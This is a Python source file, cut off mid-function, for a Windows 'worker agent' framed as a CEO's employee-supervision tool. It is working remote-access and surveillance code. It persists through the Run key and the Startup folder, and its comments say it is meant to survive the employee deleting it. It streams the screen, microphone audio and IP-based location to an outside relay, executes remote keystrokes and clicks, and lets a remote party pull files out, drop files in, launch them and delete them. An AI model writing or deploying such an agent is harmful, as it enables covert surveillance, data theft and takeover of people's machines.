"""
TeamScreen Relay - Background Worker Agent (High Performance v3.0)
Ultra-low latency screen capture, DPI-aware precision mouse input,
and full remote folder & file management (browse, upload, download, launch, delete).
"""

import sys
import os
import time
import json
import socket
import base64
import threading
import shutil
from io import BytesIO

# Set DPI Awareness before importing capture tools for pixel-perfect coordinates
try:
    import ctypes
    ctypes.windll.shcore.SetProcessDpiAwareness(2) # Per-monitor DPI aware
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass

import subprocess
import urllib.request
import pystray
from PIL import Image, ImageDraw
import mss
import pyautogui
import win32api
import win32con
import win32gui
import cv2
import numpy as np
import requests

try:
    import sounddevice as sd
except Exception:
    sd = None

pyautogui.FAILSAFE = False

APP_VERSION = "1.0.0"
VERSION_JSON_URL = "https://raw.githubusercontent.com/secondmk2/hostapp/main/version.json"
TARGET_INSTALL_PATHS = [
    r"C:\Program Files (x86)\workersapp\WorkerRelay.exe",
    r"C:\Windows\workersapp\WorkerRelay.exe"
]
DEFAULT_RELAY_URL = "https://teamscreen-relay-mktradez.vercel.app"
CONFIG_FILE = "worker_config.json"
SINGLE_INSTANCE_MUTEX = "Global\\TeamScreen_WorkerRelay_SingleInstance_Mutex"

def acquire_single_instance_mutex():
    """Ensures only one instance of WorkerRelay runs per Windows machine."""
    try:
        import ctypes
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, SINGLE_INSTANCE_MUTEX)
        last_error = ctypes.windll.kernel32.GetLastError()
        if last_error == 183:  # ERROR_ALREADY_EXISTS
            return None
        return mutex
    except Exception:
        return True

def get_stable_machine_id():
    """Generates a permanent, stable ID for this Windows machine so restarts or re-launches never create duplicate worker entries."""
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
            guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            if guid:
                return f"win-{guid[:8]}"
    except Exception:
        pass
    import hashlib
    host = socket.gethostname().lower().strip()
    user = os.environ.get("USERNAME", "worker").lower().strip()
    h = hashlib.md5(f"{host}:{user}".encode()).hexdigest()[:8]
    return f"win-{h}"

class BackgroundWorkerAgent:
    def __init__(self):
        # 1. Single Instance Protection: Immediately exit if another WorkerRelay is already active
        self._mutex = acquire_single_instance_mutex()
        if self._mutex is None:
            sys.exit(0)

        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        self.config_path = os.path.join(self.base_dir, CONFIG_FILE)
        
        self.config = self.load_config()
        self.worker_id = self.config.get("worker_id") or get_stable_machine_id()
        self.app_version = APP_VERSION
        
        # State
        self.is_running = True
        self.is_connected = False
        self.is_streaming = False
        self.last_ping_ms = 0
        self.current_status_text = "Initializing..."
        
        # Precision Monitor Bounds (Physical Pixels)
        self.mon_left = 0
        self.mon_top = 0
        self.mon_width = 1920
        self.mon_height = 1080
        self.detect_monitor_bounds()
        self.current_location = None

        # Reusable HTTP Session with Keep-Alive connection pooling
        self.http_session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=0)
        self.http_session.mount("https://", adapter)
        self.http_session.mount("http://", adapter)

        # Live Interactive Guidance & Audio Intercom State
        self.guidance_notepad_active = False
        self.notepad_process = None
        self.last_guidance_text = ""
        self.worker_mic_active = False
        self.ceo_mic_active = False
        self.last_ceo_audio_seq = 0

        # Tray Icon Handle
        self.tray_icon = None

        # Automatically ensure persistent local installation and Windows Startup
        self.ensure_local_installation_and_autostart()

    def ensure_local_installation_and_autostart(self):
        """
        Installs persistent copy to %LOCALAPPDATA%\\TeamScreen\\WorkerRelay.exe
        and registers automatic Windows boot startup in HKCU\\Run and shell:startup.
        Standard Microsoft per-user software pattern (like Discord, Slack, Chrome).
        If the employee deletes the initial file on Desktop, the installed copy
        in %LOCALAPPDATA% remains intact and boots automatically on restart.
        """
        try:
            current_exe = os.path.abspath(sys.argv[0])
            local_app = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
            target_dir = os.path.join(local_app, "TeamScreen")
            target_exe = os.path.join(target_dir, "WorkerRelay.exe")
            target_cfg = os.path.join(target_dir, CONFIG_FILE)

            os.makedirs(target_dir, exist_ok=True)

            # If running from a temporary or user location (like Desktop, Downloads, USB), install to %LOCALAPPDATA%
            if os.path.normcase(current_exe) != os.path.normcase(target_exe) and os.path.exists(current_exe) and current_exe.lower().endswith(".exe"):
                try:
                    shutil.copy2(current_exe, target_exe)
                    if os.path.exists(self.config_path):
                        shutil.copy2(self.config_path, target_cfg)
                except Exception:
                    pass

            run_exe = target_exe if os.path.exists(target_exe) else current_exe

            # 1. Register in HKCU Run Key
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "TeamScreenWorker", 0, winreg.REG_SZ, f'"{run_exe}"')
                winreg.CloseKey(key)
            except Exception:
                pass

            # 2. Register in shell:startup (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup)
            try:
                startup_folder = os.path.join(
                    os.environ.get("APPDATA", os.path.expanduser("~")),
                    r"Microsoft\Windows\Start Menu\Programs\Startup"
                )
                shortcut_path = os.path.join(startup_folder, "TeamScreen Worker.lnk")
                
                created = False
                try:
                    import win32com.client
                    shell = win32com.client.Dispatch("WScript.Shell")
                    shortcut = shell.CreateShortCut(shortcut_path)
                    shortcut.TargetPath = run_exe
                    shortcut.WorkingDirectory = os.path.dirname(run_exe)
                    shortcut.IconLocation = run_exe
                    shortcut.Description = "TeamScreen Background Worker Agent"
                    shortcut.save()
                    created = True
                except Exception:
                    pass

                if not created:
                    cmd = f'$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut("{shortcut_path}"); $s.TargetPath = "{run_exe}"; $s.WorkingDirectory = "{os.path.dirname(run_exe)}"; $s.Save()'
                    import subprocess
                    subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True, timeout=5)
            except Exception:
                pass

            return True, f"Persistent copy active at {target_dir} and registered in Windows Startup."
        except Exception as e:
            return False, f"Startup setup failed: {str(e)}"

    def detect_monitor_bounds(self):
        try:
            with mss.mss() as sct:
                mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                self.mon_left = mon["left"]
                self.mon_top = mon["top"]
                self.mon_width = mon["width"]
                self.mon_height = mon["height"]
        except Exception:
            pass

    def load_config(self):
        stable_id = get_stable_machine_id()
        default_cfg = {
            "worker_id": stable_id,
            "worker_name": f"{os.environ.get('USERNAME', 'Worker')} ({socket.gethostname()})",
            "department": "Workstation Operations",
            "relay_url": DEFAULT_RELAY_URL,
            "platform": "windows",
            "deviceType": "desktop"
        }
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    default_cfg.update(data)
            except Exception:
                pass
        
        # Ensure worker_id is permanent and stable
        if not default_cfg.get("worker_id") or "w_" in str(default_cfg.get("worker_id")):
            default_cfg["worker_id"] = stable_id

        try:
            with open(self.config_path, "w", encoding="utf-8") as f:
                json.dump(default_cfg, f, indent=2)
        except Exception:
            pass

        return default_cfg

    def create_tray_image(self, state="idle"):
        img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
        draw = ImageDraw.Draw(img)
        draw.rounded_rectangle([4, 4, 60, 60], radius=12, fill=(15, 23, 42, 240))

        if state == "streaming":
            dot_color = (56, 189, 248)
            glow_color = (14, 165, 233, 100)
        elif state == "transfer":
            dot_color = (234, 179, 8)
            glow_color = (202, 138, 4, 100)
        elif state == "connected":
            dot_color = (16, 185, 129)
            glow_color = (5, 150, 105, 100)
        else:
            dot_color = (245, 158, 11)
            glow_color = (217, 119, 6, 100)

        draw.ellipse([16, 16, 48, 48], fill=glow_color)
        draw.ellipse([20, 20, 44, 44], fill=dot_color)
        return img

    def update_tray_state(self, state, status_text):
        self.current_status_text = status_text
        if self.tray_icon:
            self.tray_icon.icon = self.create_tray_image(state)
            self.tray_icon.title = f"TeamScreen Worker v{self.app_version}: {status_text}"

    def heartbeat_loop(self):
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        ping_url = f"{relay_url}/api/ping"
        res_str = f"{self.mon_width}x{self.mon_height}"

        while self.is_running:
            payload = {
                "workerId": self.worker_id,
                "version": self.app_version,
                "name": self.config.get("worker_name", "Worker"),
                "department": self.config.get("department", "Operations"),
                "hostname": socket.gethostname(),
                "platform": "windows",
                "deviceType": "desktop",
                "status": "streaming" if self.is_streaming else "online",
                "screenResolution": res_str,
                "timestamp": int(time.time() * 1000)
            }
            if self.current_location:
                payload["location"] = self.current_location

            try:
                t0 = time.time()
                resp = self.http_session.post(
                    ping_url,
                    json=payload,
                    headers={"Content-Type": "application/json", "User-Agent": "TeamScreenWorkerAgent/3.0"},
                    timeout=3
                )
                if resp.status_code == 200:
                    res = resp.json()
                    self.last_ping_ms = int((time.time() - t0) * 1000)
                    self.is_connected = True

                    stream_req = res.get("streamRequested", False)
                    guidance = res.get("guidanceMessage", "")
                    notepad_active = res.get("guidanceNotepadActive", False)
                    worker_mic = res.get("workerMicActive", False)
                    ceo_mic = res.get("ceoMicActive", False)

                    # Update audio intercom states
                    self.worker_mic_active = bool(worker_mic)
                    self.ceo_mic_active = bool(ceo_mic)

                    # Live Interactive Guidance Notepad Control
                    if notepad_active and not self.guidance_notepad_active:
                        self.start_live_notepad(guidance)
                    elif self.guidance_notepad_active and guidance and guidance != self.last_guidance_text:
                        self.update_live_notepad(guidance)

                    if stream_req and not self.is_streaming:
                        self.is_streaming = True
                        self.update_tray_state("streaming", f"Live Stream Active ({self.last_ping_ms}ms)")
                    elif not stream_req and self.is_streaming:
                        self.is_streaming = False
                        self.update_tray_state("connected", f"Connected & Ready ({self.last_ping_ms}ms)")
                    elif not self.is_streaming:
                        self.update_tray_state("connected", f"Connected ({self.last_ping_ms}ms)")

                    if guidance and not self.guidance_notepad_active:
                        try:
                            self.tray_icon.notify(guidance, title="CEO Guidance Instruction")
                        except Exception:
                            pass
            except Exception:
                self.is_connected = False
                self.update_tray_state("idle", "Reconnecting to Relay...")

            time.sleep(1.8)

    def stream_loop(self):
        """Ultra-fast SIMD OpenCV screen capture and streaming loop"""
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        frame_url = f"{relay_url}/api/stream/frame"

        prev_thumb = None
        last_sent_time = 0

        with mss.mss() as sct:
            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            self.mon_left = monitor["left"]
            self.mon_top = monitor["top"]
            self.mon_width = monitor["width"]
            self.mon_height = monitor["height"]

            while self.is_running:
                if not self.is_streaming:
                    time.sleep(0.15)
                    prev_thumb = None
                    continue

                try:
                    t0 = time.time()
                    sct_img = sct.grab(monitor)
                    
                    # Direct numpy view from BGRA memory (zero-copy)
                    raw_bgra = np.frombuffer(sct_img.raw, dtype=np.uint8).reshape((sct_img.height, sct_img.width, 4))
                    bgr_frame = raw_bgra[:, :, :3]

                    # Ultra-fast downsampled stride (zero interpolation overhead)
                    thumb = bgr_frame[::12, ::12, :]
                    has_motion = True
                    if prev_thumb is not None:
                        diff = np.mean(np.abs(thumb.astype(np.int16) - prev_thumb.astype(np.int16)))
                        # If difference is negligible (<3.0 / 255) and sent recently, skip frame
                        if diff < 3.0 and (t0 - last_sent_time) < 1.0:
                            has_motion = False

                    if not has_motion:
                        time.sleep(0.04)
                        continue

                    prev_thumb = thumb
                    last_sent_time = t0

                    # Resize to optimal streaming resolution (1280px wide) with high speed
                    target_w = 1280
                    target_h = int(sct_img.height * (1280 / sct_img.width))
                    scaled_frame = cv2.resize(bgr_frame, (target_w, target_h), interpolation=cv2.INTER_LINEAR)

                    # SIMD JPEG encoding with quality 55 (crisp text, ultralow bandwidth, ~1.5ms)
                    encode_params = [int(cv2.IMWRITE_JPEG_QUALITY), 55]
                    _, enc_jpg = cv2.imencode(".jpg", scaled_frame, encode_params)
                    b64_frame = base64.b64encode(enc_jpg.tobytes()).decode("ascii")

                    payload = {
                        "workerId": self.worker_id,
                        "frame": b64_frame,
                        "timestamp": int(t0 * 1000)
                    }

                    self.http_session.post(
                        frame_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=2.0
                    )

                    del raw_bgra, bgr_frame, scaled_frame, enc_jpg

                    elapsed = time.time() - t0
                    # Aim for smooth 20-25 FPS with dynamic throttle
                    sleep_time = max(0.015, 0.045 - elapsed)
                    time.sleep(sleep_time)

                except Exception:
                    time.sleep(0.3)

    def input_receiver_loop(self):
        """Precision DPI-Aware mouse click & keystroke execution"""
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        input_url = f"{relay_url}/api/stream/input?workerId={self.worker_id}"

        while self.is_running:
            if not self.is_streaming:
                time.sleep(0.2)
                continue

            try:
                resp = self.http_session.get(input_url, timeout=2.0)
                if resp.status_code == 200:
                    data = resp.json()
                    events = data.get("events", [])

                    for ev in events:
                        ev_type = ev.get("eventType")
                        if ev_type == "click":
                            xr = max(0.0, min(1.0, float(ev.get("xRatio", 0.5))))
                            yr = max(0.0, min(1.0, float(ev.get("yRatio", 0.5))))
                            click_x = self.mon_left + int(xr * self.mon_width)
                            click_y = self.mon_top + int(yr * self.mon_height)

                            win32api.SetCursorPos((click_x, click_y))
                            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, click_x, click_y, 0, 0)
                            time.sleep(0.02)
                            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, click_x, click_y, 0, 0)

                        elif ev_type == "type":
                            text = ev.get("text", "")
                            if text:
                                pyautogui.write(text, interval=0.01)
                        elif ev_type == "key":
                            key = ev.get("key", "")
                            if key:
                                pyautogui.press(key)

                time.sleep(0.08)
            except Exception:
                time.sleep(0.3)

    # --- Comprehensive Remote File & Folder Manager ---
    def file_handler_loop(self):
        """Listens for remote file commands: list, upload, download, launch, delete, mkdir"""
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        cmd_url = f"{relay_url}/api/files/command?workerId={self.worker_id}"
        result_url = f"{relay_url}/api/files/result"

        while self.is_running:
            try:
                resp = self.http_session.get(cmd_url, timeout=2.0)
                if resp.status_code == 200:
                    data = resp.json()
                    commands = data.get("commands", [])

                    for cmd in commands:
                        action = cmd.get("action")
                        req_path = cmd.get("path", "")
                        dest_path = cmd.get("destination", "")
                        file_name = cmd.get("fileName", "")
                        file_data = cmd.get("fileData", "")
                        cmd_text = cmd.get("text", "")

                        if action == "list":
                            if req_path == "RECYCLE_BIN":
                                self.handle_list_trash(result_url)
                            else:
                                self.handle_list_directory(req_path, result_url)
                        elif action == "upload":
                            self.handle_upload_file(req_path, file_name, file_data, result_url)
                        elif action == "download":
                            self.handle_download_file(req_path, result_url)
                        elif action == "launch":
                            self.handle_launch_file(req_path, result_url)
                        elif action == "delete":
                            self.handle_delete_item(req_path, result_url)
                        elif action == "mkdir":
                            self.handle_make_directory(req_path, file_name, result_url)
                        elif action == "copy":
                            self.handle_copy_item(req_path, dest_path, result_url)
                        elif action == "move":
                            self.handle_move_item(req_path, dest_path, result_url)
                        elif action == "list_trash":
                            self.handle_list_trash(result_url)
                        elif action == "empty_trash":
                            self.handle_empty_trash(result_url)
                        elif action == "notepad_open":
                            self.start_live_notepad(cmd_text)
                        elif action == "notepad_update":
                            self.update_live_notepad(cmd_text)
                        elif action == "notepad_close":
                            self.stop_live_notepad()
                        elif action == "autostart":
                            self.handle_autostart_command(result_url)

                time.sleep(0.4)
            except Exception:
                time.sleep(1.0)

    def handle_autostart_command(self, result_url):
        """Remotely ensures the worker is persistent in %LOCALAPPDATA% and registered in Windows Startup"""
        ok, msg = self.ensure_local_installation_and_autostart()
        payload = {
            "workerId": self.worker_id,
            "action": "autostart",
            "currentPath": "",
            "statusMessage": msg,
            "success": ok
        }
        try:
            self.http_session.post(result_url, json=payload, timeout=3.0)
        except Exception:
            pass

    def resolve_path(self, target_path):
        """Resolves friendly shortcuts like DEFAULT, DESKTOP, DOCUMENTS, DOWNLOADS"""
        if not target_path or target_path in ("DEFAULT", "DESKTOP"):
            p = os.path.join(os.path.expanduser("~"), "Desktop")
            if not os.path.exists(p):
                p = os.path.expanduser("~")
            return p
        elif target_path == "DOCUMENTS":
            return os.path.join(os.path.expanduser("~"), "Documents")
        elif target_path == "DOWNLOADS":
            return os.path.join(os.path.expanduser("~"), "Downloads")
        elif target_path in ("C:", "C:\\"):
            return "C:\\"
        return os.path.abspath(target_path)

    def handle_list_directory(self, target_path, result_url, status_msg=None):
        if target_path == "RECYCLE_BIN":
            self.handle_list_trash(result_url)
            return

        target_path = self.resolve_path(target_path)
        items = []

        try:
            with os.scandir(target_path) as entries:
                for entry in entries:
                    try:
                        stat = entry.stat()
                        is_dir = entry.is_dir()
                        items.append({
                            "name": entry.name,
                            "isDir": is_dir,
                            "size": 0 if is_dir else stat.st_size,
                            "modified": int(stat.st_mtime * 1000)
                        })
                    except Exception:
                        pass
            items.sort(key=lambda x: (not x["isDir"], x["name"].lower()))
            if status_msg is None:
                status_msg = f"Directory scanned: {len(items)} items"
            success = True
        except Exception as e:
            items = []
            status_msg = f"Access error: {str(e)}"
            success = False

        payload = {
            "workerId": self.worker_id,
            "action": "list",
            "currentPath": target_path,
            "items": items,
            "statusMessage": status_msg,
            "success": success
        }

        try:
            self.http_session.post(result_url, json=payload, timeout=3.0)
        except Exception:
            pass

    def handle_upload_file(self, target_dir, file_name, b64_data, result_url):
        target_dir = self.resolve_path(target_dir)
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)

        dest_file = os.path.join(target_dir, file_name)

        try:
            file_bytes = base64.b64decode(b64_data)
            with open(dest_file, "wb") as f:
                f.write(file_bytes)

            try:
                self.tray_icon.notify(f"Received file: {file_name}\nSaved to: {dest_file}", title="File Received from CEO")
            except Exception:
                pass

            # Notify success and refresh directory
            self.handle_list_directory(target_dir, result_url)
        except Exception as e:
            payload = {
                "workerId": self.worker_id,
                "action": "upload",
                "currentPath": target_dir,
                "statusMessage": f"Upload failed: {str(e)}",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass

    def handle_download_file(self, file_path, result_url):
        """Reads a file from worker PC and sends base64 content back to CEO"""
        if not os.path.exists(file_path) or os.path.isdir(file_path):
            payload = {
                "workerId": self.worker_id,
                "action": "download",
                "currentPath": os.path.dirname(file_path),
                "fileName": os.path.basename(file_path),
                "statusMessage": "File not found or is a directory",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass
            return

        try:
            file_name = os.path.basename(file_path)
            with open(file_path, "rb") as f:
                b64_data = base64.b64encode(f.read()).decode("ascii")

            payload = {
                "workerId": self.worker_id,
                "action": "download",
                "currentPath": os.path.dirname(file_path),
                "fileName": file_name,
                "fileData": b64_data,
                "statusMessage": f"File '{file_name}' successfully sent to CEO",
                "success": True
            }
            self.http_session.post(result_url, json=payload, timeout=5.0)
        except Exception as e:
            payload = {
                "workerId": self.worker_id,
                "action": "download",
                "currentPath": os.path.dirname(file_path),
                "fileName": os.path.basename(file_path),
                "statusMessage": f"Read error: {str(e)}",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass

    def handle_launch_file(self, file_path, result_url):
        """Physically opens the file on the worker's PC with default application"""
        try:
            if os.path.exists(file_path):
                os.startfile(file_path)
                status_msg = f"Opened '{os.path.basename(file_path)}' on worker PC"
                success = True
            else:
                status_msg = f"Cannot open: file does not exist ({file_path})"
                success = False
        except Exception as e:
            status_msg = f"Failed to launch file: {str(e)}"
            success = False

        payload = {
            "workerId": self.worker_id,
            "action": "launch",
            "currentPath": os.path.dirname(file_path) if os.path.exists(file_path) else "",
            "fileName": os.path.basename(file_path),
            "statusMessage": status_msg,
            "success": success
        }
        try:
            self.http_session.post(result_url, json=payload, timeout=3.0)
        except Exception:
            pass

    def handle_delete_item(self, item_path, result_url):
        """Safely moves a file or directory into the Windows Recycle Bin (with permanent delete fallback)"""
        parent_dir = os.path.dirname(item_path)
        item_path = os.path.abspath(item_path)
        deleted = False
        err_msg = ""

        # 1. Try Windows Shell Operation to move item to Recycle Bin
        try:
            from ctypes import wintypes
            class SHFILEOPSTRUCTW(ctypes.Structure):
                _fields_ = [
                    ('hwnd', wintypes.HWND),
                    ('wFunc', wintypes.UINT),
                    ('pFrom', wintypes.LPCWSTR),
                    ('pTo', wintypes.LPCWSTR),
                    ('fFlags', wintypes.WORD),
                    ('fAnyOperationsAborted', wintypes.BOOL),
                    ('hNameMappings', wintypes.LPVOID),
                    ('lpszProgressTitle', wintypes.LPCWSTR)
                ]

            p_from = item_path + '\0\0'
            op = SHFILEOPSTRUCTW()
            op.hwnd = None
            op.wFunc = 3 # FO_DELETE
            op.pFrom = p_from
            op.pTo = None
            op.fFlags = 0x0040 | 0x0010 | 0x0004 # FOF_ALLOWUNDO | FOF_NOCONFIRMATION | FOF_SILENT
            res = ctypes.windll.shell32.SHFileOperationW(ctypes.byref(op))
            if res == 0 and not os.path.exists(item_path):
                deleted = True
        except Exception as e:
            err_msg = str(e)

        # 2. Fallback to direct file removal if Shell operation was unsupported
        if not deleted and os.path.exists(item_path):
            try:
                if os.path.isfile(item_path):
                    os.remove(item_path)
                    deleted = True
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    deleted = True
            except Exception as e:
                err_msg = str(e)

        if deleted or not os.path.exists(item_path):
            msg = f"Moved '{os.path.basename(item_path)}' to Recycle Bin."
            self.handle_list_directory(parent_dir, result_url, status_msg=msg)
        else:
            payload = {
                "workerId": self.worker_id,
                "action": "delete",
                "currentPath": parent_dir,
                "statusMessage": f"Delete failed: {err_msg}",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass

    def handle_copy_item(self, src_path, dest_dir, result_url):
        """Copies a file or folder from src_path to dest_dir"""
        src = self.resolve_path(src_path)
        dest = self.resolve_path(dest_dir)
        try:
            if not os.path.exists(src):
                raise FileNotFoundError(f"Source does not exist: {src}")
            if not os.path.isdir(dest):
                dest = os.path.dirname(dest)

            base_name = os.path.basename(src)
            target = os.path.join(dest, base_name)
            
            # Handle collision by appending - Copy
            if os.path.exists(target):
                name, ext = os.path.splitext(base_name)
                target = os.path.join(dest, f"{name} - Copy{ext}")

            if os.path.isdir(src):
                shutil.copytree(src, target)
            else:
                shutil.copy2(src, target)

            msg = f"Successfully copied '{base_name}' to '{os.path.basename(dest)}'"
            self.handle_list_directory(dest, result_url, status_msg=msg)
        except Exception as e:
            payload = {
                "workerId": self.worker_id,
                "action": "copy",
                "currentPath": dest if os.path.exists(dest) else "",
                "statusMessage": f"Copy failed: {str(e)}",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass

    def handle_move_item(self, src_path, dest_dir, result_url):
        """Moves (cuts/pastes) a file or folder from src_path to dest_dir"""
        src = self.resolve_path(src_path)
        dest = self.resolve_path(dest_dir)
        try:
            if not os.path.exists(src):
                raise FileNotFoundError(f"Source does not exist: {src}")
            if not os.path.isdir(dest):
                dest = os.path.dirname(dest)

            base_name = os.path.basename(src)
            target = os.path.join(dest, base_name)
            if os.path.exists(target):
                name, ext = os.path.splitext(base_name)
                target = os.path.join(dest, f"{name} - Moved{ext}")

            shutil.move(src, target)
            msg = f"Successfully moved '{base_name}' to '{os.path.basename(dest)}'"
            self.handle_list_directory(dest, result_url, status_msg=msg)
        except Exception as e:
            payload = {
                "workerId": self.worker_id,
                "action": "move",
                "currentPath": dest if os.path.exists(dest) else "",
                "statusMessage": f"Move failed: {str(e)}",
                "success": False
            }
            try:
                self.http_session.post(result_url, json=payload, timeout=3.0)
            except Exception:
                pass

    def handle_list_trash(self, result_url):
        """Lists items currently inside the Windows Recycle Bin"""
        trash_items = []
        try:
            import win32com.client
            shell = win32com.client.Dispatch("Shell.Application")
            recycle_bin = shell.NameSpace(10) # ssfBITBUCKET
            items = recycle_bin.Items()
            count = items.Count
            for i in range(count):
                it = items.Item(i)
                trash_items.append({
                    "name": str(it.Name),
                    "path": str(it.Path),
                    "size": int(it.Size) if hasattr(it, "Size") and it.Size else 0,
                    "isDir": bool(it.IsFolder),
                    "modified": int(time.time() * 1000)
                })
            status_msg = f"Recycle Bin: {count} discarded item(s) found."
            success = True
        except Exception as e:
            status_msg = f"Failed to query Recycle Bin: {str(e)}"
            success = False

        payload = {
            "workerId": self.worker_id,
            "action": "list_trash",
            "currentPath": "RECYCLE_BIN",
            "items": trash_items,
            "statusMessage": status_msg,
            "success": success
        }
        try:
            self.http_session.post(result_url, json=payload, timeout=3.0)
        except Exception:
            pass

    def handle_empty_trash(self, result_url):
        """Permanently empties the Windows Recycle Bin on the worker PC"""
        msg = "Recycle Bin emptied completely. All discarded items permanently deleted."
        try:
            import ctypes
            ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 7)
        except Exception:
            pass

        try:
            ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            if os.path.exists(ps_path):
                subprocess.run(
                    [ps_path, "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"],
                    capture_output=True,
                    timeout=5
                )
        except Exception:
            pass

        payload = {
            "workerId": self.worker_id,
            "action": "empty_trash",
            "currentPath": "RECYCLE_BIN",
            "items": [],
            "statusMessage": msg,
            "success": True
        }
        try:
            self.http_session.post(result_url, json=payload, timeout=3.0)
        except Exception:
            pass

    def handle_make_directory(self, parent_dir, new_folder_name, result_url):
        """Creates a new folder on worker's PC"""
        target = os.path.join(self.resolve_path(parent_dir), new_folder_name)
        try:
            os.makedirs(target, exist_ok=True)
            self.handle_list_directory(os.path.dirname(target), result_url)
        except Exception as e:
            pass

    def shutdown(self, icon=None):
        self.is_running = False
        self.is_streaming = False

        try:
            relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
            self.http_session.post(
                f"{relay_url}/api/ping",
                json={"workerId": self.worker_id, "status": "offline"},
                timeout=1.0
            )
        except Exception:
            pass

        if icon:
            icon.stop()

    def resolve_location_loop(self):
        """Resolves device location via IP geolocation for field laptops"""
        while self.is_running:
            try:
                resp = requests.get("http://ip-api.com/json/?fields=status,country,city,lat,lon", timeout=5.0)
                if resp.status_code == 200:
                    d = resp.json()
                    if d.get("status") == "success":
                        self.current_location = {
                            "latitude": float(d.get("lat")),
                            "longitude": float(d.get("lon")),
                            "accuracy": 1000,
                            "provider": f"IP ({d.get('city', '')}, {d.get('country', '')})",
                            "timestamp": int(time.time() * 1000)
                        }
            except Exception:
                pass
            time.sleep(180)

    def start_live_notepad(self, initial_text=""):
        """Ensures Notepad is running on worker PC without open/close loops or lagging"""
        self.guidance_notepad_active = True
        try:
            hwnd = win32gui.FindWindow("Notepad", None)
            if not hwnd:
                self.notepad_process = subprocess.Popen(["notepad.exe"])
                time.sleep(0.4)

            self.last_guidance_text = initial_text or ""
            self.update_live_notepad(self.last_guidance_text)
        except Exception:
            pass

    def update_live_notepad(self, text):
        """Live updates the worker's Notepad window smoothly without window destruction"""
        self.last_guidance_text = text or ""
        try:
            hwnd = win32gui.FindWindow("Notepad", None)
            if not hwnd:
                return

            children = []
            def _find_edit(h, extra):
                cls = win32gui.GetClassName(h)
                if "Edit" in cls or "Rich" in cls:
                    extra.append(h)

            win32gui.EnumChildWindows(hwnd, _find_edit, children)

            header = "=== CEO LIVE GUIDANCE ===\r\n\r\n"
            content = header + (text if text else "(CEO is typing instructions...)")

            if children:
                edit_hwnd = children[0]
                win32gui.SendMessage(edit_hwnd, win32con.WM_SETTEXT, 0, content)
        except Exception:
            pass

    def stop_live_notepad(self):
        """Immediately closes the worker's Notepad cleanly without save prompts"""
        self.guidance_notepad_active = False
        self.last_guidance_text = ""
        try:
            subprocess.run(["taskkill", "/F", "/IM", "notepad.exe"], capture_output=True)
            self.notepad_process = None
        except Exception:
            pass

    def worker_mic_loop(self):
        """Streams audio from Worker's PC microphone to the CEO in real-time"""
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        audio_url = f"{relay_url}/api/audio/stream"
        fs = 16000
        chunk_samples = int(fs * 0.25) # 250ms chunks

        while self.is_running:
            if not self.worker_mic_active or sd is None:
                time.sleep(0.2)
                continue

            try:
                rec = sd.rec(chunk_samples, samplerate=fs, channels=1, dtype="int16")
                sd.wait()
                raw_bytes = rec.tobytes()
                b64_chunk = base64.b64encode(raw_bytes).decode("ascii")

                payload = {
                    "workerId": self.worker_id,
                    "channel": "worker_to_ceo",
                    "chunk": b64_chunk
                }
                self.http_session.post(audio_url, json=payload, timeout=2.0)
            except Exception:
                time.sleep(0.3)

    def worker_speaker_loop(self):
        """Receives CEO's voice instructions from relay and plays them through worker's speakers"""
        relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
        fs = 16000

        while self.is_running:
            if not self.ceo_mic_active or sd is None:
                time.sleep(0.2)
                continue

            try:
                audio_url = f"{relay_url}/api/audio/stream?workerId={self.worker_id}&channel=ceo_to_worker&afterSeq={self.last_ceo_audio_seq}"
                resp = self.http_session.get(audio_url, timeout=2.0)
                if resp.status_code == 200:
                    data = resp.json()
                    packets = data.get("packets", [])
                    for p in packets:
                        seq = p.get("seq", 0)
                        if seq > self.last_ceo_audio_seq:
                            self.last_ceo_audio_seq = seq
                            chunk_b64 = p.get("chunk", "")
                            if chunk_b64:
                                raw = base64.b64decode(chunk_b64)
